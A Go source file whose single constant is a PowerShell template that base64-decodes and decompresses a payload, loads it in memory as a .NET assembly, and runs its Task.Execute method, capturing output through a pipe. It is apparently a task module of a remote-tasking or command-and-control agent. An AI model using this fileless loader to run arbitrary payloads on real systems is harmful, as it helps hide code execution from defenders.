package tasks

const PowerShellScript = `
$data = "%s"
$parts = $data.split(",");
$params = $parts[1..$parts.length];

$bytes = [System.Convert]::FromBase64String($parts[0]);

# Create a memory stream to decompress the byte array
$ms = New-Object System.IO.MemoryStream;
$output = New-Object System.IO.MemoryStream

$ms.Write($bytes, 0, $bytes.Length)
$ms.Seek(0, 0) | Out-Null

# Decompress the byte array using DeflateStream
$sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096)
$bytesRead = $sr.Read($buffer, 0, $buffer.Length)

# Read from the decompressed stream into a new byte array
while ($bytesRead -ne 0) {
    $output.Write($buffer, 0, $bytesRead)
    $bytesRead = $sr.Read($buffer, 0, $buffer.Length)
}

$assembly = [Reflection.Assembly]::Load($output.ToArray())

# Check if the Task class has an OutputStream property
$strmprop = $assembly.GetType("Task").GetProperty("OutputStream")

Write-Host $strmprop
# Execute the assembly based on whether OutputStream is available
if (!$strmprop) {
    Write-Host "Output pipe"
    $Results = $assembly.GetType("Task").GetMethod("Execute").Invoke($null, $params)
    Write-Output "Task execution results: $Results"
}
else {
    # Output pipe scenario
    $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable)
    $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle)
    $streamReader = [System.IO.StreamReader]::new($pipeServerStream)

    # Prepare parameters for background task execution
    $dict = @{
        "assembly" = $assembly
        "params" = $params
        "pipe" = $pipeClientStream
    }

    # Create a PowerShell instance for executing the background task
    $ps = [PowerShell]::Create()
    $task = $ps.AddScript('
        [CmdletBinding()]
        param(
            [System.Reflection.Assembly]
            $assembly,

            [String[]]
            $params,

            [IO.Pipes.AnonymousPipeClientStream]
            $Pipe
        )

        try {
            $streamProp = $assembly.GetType("Task").GetProperty("OutputStream")
            $streamProp.SetValue($null, $pipe, $null)
            $assembly.GetType("Task").GetMethod("Execute").Invoke($null, $params)
        }
        finally {
            $pipe.Dispose()
        }
    ').AddParameters($dict).BeginInvoke()

    $pipeOutput = [Text.StringBuilder]::new()
    $buffer = [char[]]::new($pipeServerStream.InBufferSize)

    # Read output from the pipe stream
    while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
        [void]$pipeOutput.Append($buffer, 0, $read)
    }

    # End the background task execution and retrieve results
    $ps.EndInvoke($task)
    $Results = $pipeOutput.ToString()

    # Cleanup resources
    $pipeServerStream.Dispose()
    $streamReader.Dispose()

    Write-Output "$Results"
}
`
